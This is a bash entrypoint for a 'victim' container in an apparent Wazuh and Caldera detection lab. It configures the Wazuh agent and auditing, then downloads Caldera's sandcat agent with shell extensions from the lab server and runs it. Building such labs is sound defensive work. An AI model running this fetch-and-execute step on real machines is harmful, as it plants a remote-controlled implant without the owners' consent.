#!/bin/bash
# Victim entrypoint: configure agent, start auxiliary loggers, start wazuh,
# then fetch + run Caldera sandcat.
#
# Order matters:
#   1. inject localfiles.xml into ossec.conf (agent-side training-schema cfg)
#   2. start rsyslog so PAM/sudo/sshd/dpkg decoders have log files to tail
#   3. start auditd so data.audit.* events get produced (best-effort — in
#      containers without CAP_AUDIT_CONTROL the kernel netlink will be busy;
#      we log and continue)
#   4. enroll + start wazuh-agent
#   5. wait for Caldera, fetch sandcat, run it
set -e

MANAGER_HOST="${WAZUH_MANAGER:-wazuh.manager}"
CALDERA_HOST="${CALDERA_HOST:-caldera}"
CALDERA_PORT="${CALDERA_PORT:-8888}"
CALDERA_GROUP="${CALDERA_GROUP:-red}"
AGENT_NAME="${WAZUH_AGENT_NAME:-$(hostname)}"

echo "[victim] manager=${MANAGER_HOST} caldera=${CALDERA_HOST}:${CALDERA_PORT} name=${AGENT_NAME}"

# ---- 1. inject training-schema localfiles into ossec.conf ---------------
if ! grep -q "STRIX_LOCALFILES_INJECTED" /var/ossec/etc/ossec.conf; then
  echo "[victim] injecting training-schema <localfile>/<syscheck>/<sca> stanzas"
  # Insert the fragment just before the closing </ossec_config>
  python3 - <<'PY'
import pathlib, re
conf = pathlib.Path('/var/ossec/etc/ossec.conf')
frag = pathlib.Path('/opt/strix/localfiles.xml').read_text()
text = conf.read_text()
marker = '<!-- STRIX_LOCALFILES_INJECTED -->'
injection = f"\n{marker}\n{frag}\n"
text = re.sub(r'</ossec_config>\s*$', lambda m: injection + '</ossec_config>\n', text, count=1)
conf.write_text(text)
PY
fi

# Point the agent at the manager.
sed -i "s|<address>.*</address>|<address>${MANAGER_HOST}</address>|g" /var/ossec/etc/ossec.conf

# ---- 1b. dedicated benign-traffic user ---------------------------------
# `strixbenign` runs the benign generator. Filebeat tags audit events whose
# auid resolves to this UID with strix.synthetic_benign:true so the labeller
# can separate them from real attacks.
if ! id -u strixbenign >/dev/null 2>&1; then
  useradd -m -s /bin/bash -u 4242 strixbenign 2>/dev/null || \
    useradd -m -s /bin/bash strixbenign 2>/dev/null || true
fi
# Pin the UID to a file so filebeat / orchestrator can read it.
id -u strixbenign > /opt/strix/strixbenign.uid 2>/dev/null || true

# Make sure the log files the decoders expect actually exist.
# /var/log/audit may be a read-only bind-mount from the host (provides
# real auditd coverage when the container can't claim audit netlink), so
# only touch its log if it's writable.
mkdir -p /var/log /var/log/apache2
[ -d /var/log/audit ] || mkdir -p /var/log/audit
touch /var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/dpkg.log \
      /var/log/apache2/access.log
[ -w /var/log/audit ] && touch /var/log/audit/audit.log || \
  echo "[victim] /var/log/audit is read-only (host bind-mount) — skipping touch"

# ---- 2. rsyslog ---------------------------------------------------------
if command -v rsyslogd >/dev/null 2>&1; then
  echo "[victim] starting rsyslogd"
  rsyslogd || echo "[victim] rsyslogd failed to start (continuing)"
fi

# ---- 3. auditd (best-effort) -------------------------------------------
if command -v auditd >/dev/null 2>&1; then
  echo "[victim] starting auditd (may fail silently inside unprivileged containers)"
  auditd -n &
  # A minimal rule set so EXECVE / PATH / SYSCALL records appear — matches the
  # training data's auditd coverage.
  sleep 1
  auditctl -D >/dev/null 2>&1 || true
  auditctl -a always,exit -F arch=b64 -S execve -k exec 2>/dev/null || \
    echo "[victim] auditctl: kernel audit netlink unavailable — data.audit.* features will be sparse"
fi

# ---- 4. wazuh agent -----------------------------------------------------
until getent hosts "${MANAGER_HOST}" >/dev/null 2>&1; do
  echo "[victim] waiting for ${MANAGER_HOST} DNS..."
  sleep 2
done

# If we already have a valid client.keys (persistent volume), skip enrollment.
# Otherwise enroll. agent-auth's -r ("replace") asks the manager to overwrite
# any existing record for this agent name — needed when a previous container
# instance left a stale entry in the manager's client.keys and authd's <force>
# settings would otherwise block re-enrollment for an hour.
if [ -s /var/ossec/etc/client.keys ] && grep -q "${AGENT_NAME}" /var/ossec/etc/client.keys; then
  echo "[victim] reusing persisted client.keys for ${AGENT_NAME}"
else
  echo "[victim] enrolling ${AGENT_NAME} with manager (-r replace)"
  # Try with -r first; fall back to plain enroll on older managers.
  /var/ossec/bin/agent-auth -m "${MANAGER_HOST}" -A "${AGENT_NAME}" -r 2>/tmp/agent-auth.log || \
    /var/ossec/bin/agent-auth -m "${MANAGER_HOST}" -A "${AGENT_NAME}" 2>>/tmp/agent-auth.log || \
    { echo "[victim] agent-auth failed:"; cat /tmp/agent-auth.log; }
fi

/var/ossec/bin/wazuh-control start || true

# ---- 5. sandcat ---------------------------------------------------------
echo "[victim] waiting for caldera at http://${CALDERA_HOST}:${CALDERA_PORT}..."
until curl -sf "http://${CALDERA_HOST}:${CALDERA_PORT}/" >/dev/null 2>&1; do sleep 3; done

curl -sSf -X POST \
  -H "file: sandcat.go" \
  -H "platform: linux" \
  -H "gocat-extensions: shells,proc,donut" \
  "http://${CALDERA_HOST}:${CALDERA_PORT}/file/download" \
  -o /usr/local/bin/sandcat

chmod +x /usr/local/bin/sandcat
/usr/local/bin/sandcat \
  -server "http://${CALDERA_HOST}:${CALDERA_PORT}" \
  -group "${CALDERA_GROUP}" &

echo "[victim] sandcat launched (pid=$!); tailing wazuh ossec.log"
exec tail -F /var/ossec/logs/ossec.log
